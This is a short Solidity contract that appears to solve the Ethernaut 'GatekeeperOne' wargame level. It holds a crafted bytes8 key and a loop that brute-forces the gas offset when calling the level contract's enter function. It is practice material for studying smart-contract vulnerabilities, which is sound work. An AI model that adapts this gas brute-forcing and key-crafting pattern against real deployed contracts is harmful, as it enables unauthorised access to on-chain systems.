// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

import "./GatekeeperOne.sol";

contract Attackgateone {
    address public add = 0xAABEDDe5e0B28B89D3D71426fFba93975FC16fff;
    GatekeeperOne g = GatekeeperOne(0x05eeD294932Fe08b3Dd0370a4de0aAf33d228850);
    bytes8 public key = 0x0001000000006fff;

    function attack()public {
        for(uint i=0;i<150;i++){
            (bool success,) = address(g).call{gas:i+200+8191*3}(abi.encodeWithSignature("enter(bytes8)",key));
            if(success)
            break;
        }

    }
}
